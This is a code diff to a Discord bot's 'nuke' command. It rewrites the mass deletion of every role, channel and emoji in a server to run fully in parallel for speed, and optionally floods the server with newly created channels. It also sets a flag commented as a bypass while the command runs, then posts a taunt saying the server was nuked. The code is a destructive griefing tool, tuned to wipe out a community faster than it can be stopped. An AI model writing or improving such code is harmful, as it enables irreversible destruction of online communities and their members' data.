@@ -134,69 +134,63 @@ module.exports = {
         const emojis = guild.emojis.cache;
 
         // --- DELETE OPERATIONS (STAGGERED) ---
-        const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+        // --- DELETE OPERATIONS (GLOBAL PARALLEL) ---
 
-        // 1. Roles (Sequential Stagger)
-        for (const r of roles.values()) {
-          await r.delete().catch(() => { });
-          await wait(300);
-        }
+        // HYPER-VELOCITY: Run Deletions AND Rebuild SIMULTANEOUSLY
+        const tasks = [];
 
-        // 2. Channels (Sequential Stagger)
-        for (const c of channels.values()) {
-          await c.delete().catch(() => { });
-          await wait(300);
-        }
+        // 1. Queue Deletions
+        tasks.push(Promise.all(roles.map(r => r.delete().catch(() => { }))));
+        tasks.push(Promise.all(channels.map(c => c.delete().catch(() => { }))));
+        tasks.push(Promise.all(emojis.map(e => e.delete().catch(() => { }))));
 
-        // 3. Emojis (Sequential Stagger)
-        for (const e of emojis.values()) {
-          await e.delete().catch(() => { });
-          await wait(100);
-        }
-
+        // 2. Queue Rebuild (If requested)
+        let rebuildResults = [];
         if (rebuild) {
-          // Immediately start rebuilding without waiting for deletions to finish
-          // This is "Fast as F**k" mode
-
-          // HYPER-PULSE REBUILDING (Batch Processing)
-          const results = [];
-          const batchSize = 10;
-          for (let i = 0; i < params.count; i += batchSize) {
-            const batch = [];
-            for (let j = 0; j < batchSize && (i + j) < params.count; j++) {
-              batch.push(
-                guild.channels.create({
-                  name: params.name,
-                  type: ChannelType.GuildText,
-                  reason: "Protocol 0: Rebuild"
-                }).catch(() => { })
-              );
-            }
-            const batchResults = await Promise.all(batch);
-            results.push(...batchResults);
-            await wait(150); // Small gap between batches to breathe
+          const rebuildPromises = [];
+          for (let i = 0; i < params.count; i++) {
+            rebuildPromises.push(
+              guild.channels.create({
+                name: params.name,
+                type: ChannelType.GuildText,
+                reason: "Protocol 0: Rebuild"
+              }).catch(() => { })
+            );
           }
+          // Add rebuild to the main parallel execution
+          // We store the promise to await it separately if we need the results, 
+          // but Promise.all(tasks) will drive them all.
+          tasks.push(Promise.all(rebuildPromises).then(res => { rebuildResults = res; }));
+        }
 
-          // Find first successfully created channel
-          const firstChannel = results.find(r => r.status === "fulfilled")?.value;
+        // FIRE EVERYTHING
+        message.client.nukingGuilds.add(guild.id); // ⚡ ACTIVATE BYPASS
+        try {
+          await Promise.all(tasks);
+        } finally {
+          message.client.nukingGuilds.delete(guild.id); // ⚡ DEACTIVATE BYPASS
+        }
 
+        // Post-Nuke Logic
+        if (rebuild) {
+          const firstChannel = rebuildResults.find(c => c);
           if (firstChannel) {
             firstChannel.send({
               content: `# SERVER NUKED BY <@${message.author.id}>\n\n**Have a nice day! 🚮**\n*Go touch some grass.*`
             }).catch(() => { });
           }
         } else {
-          // Final goodbye before channel deletion/response
+          // Purge Only: Try to send success if channel still exists (unlikely in parallel mode)
           if (message.channel) {
-            await message.channel.send({
+            message.channel.send({
               embeds: [new EmbedBuilder()
                 .setColor(SUCCESS_COLOR)
                 .setTitle("✅ ANNIHILATION COMPLETE")
-                .setDescription("The server has been fully sanitized.")
-                .setFooter({ text: "BlueSealPrime • Priority Alpha Success" })]
+                .setDescription("The server has been fully sanitized.")]
             }).catch(() => { });
           }
         }
+
       } catch (err) {
         console.error("Enuke Error:", err);
         message.channel.send("❌ **Critical Failure during Protocol 0.**").catch(() => { });
